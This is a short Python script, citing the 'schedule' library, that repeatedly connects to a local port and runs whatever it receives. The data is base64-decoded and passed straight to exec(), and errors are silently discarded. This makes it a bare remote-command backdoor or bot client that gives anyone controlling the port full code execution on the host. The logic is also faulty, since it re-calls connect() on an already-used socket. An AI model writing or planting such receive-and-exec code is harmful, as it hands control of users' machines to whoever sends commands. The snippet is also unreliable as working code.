# Ref: https://pypi.org/project/schedule/

import socket, schedule
from time import sleep
from base64 import b64decode

node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def update():
    node_socket.connect(("127.0.0.1", 7890))

def run(command):
    try:
        exec(b64decode(command))
        return True
    except Exception as error:
        return False

def start():
    task = node_socket.recv(1024)
    if run(task):
        pass
    else:
        pass

if __name__ == "__main__":
    # Schedule tasks:
    schedule.every(59).seconds.do(update)
    schedule.every(1).minutes.do(start)
    while True:
        # Do it:
        schedule.run_pending()
        sleep(0.1)
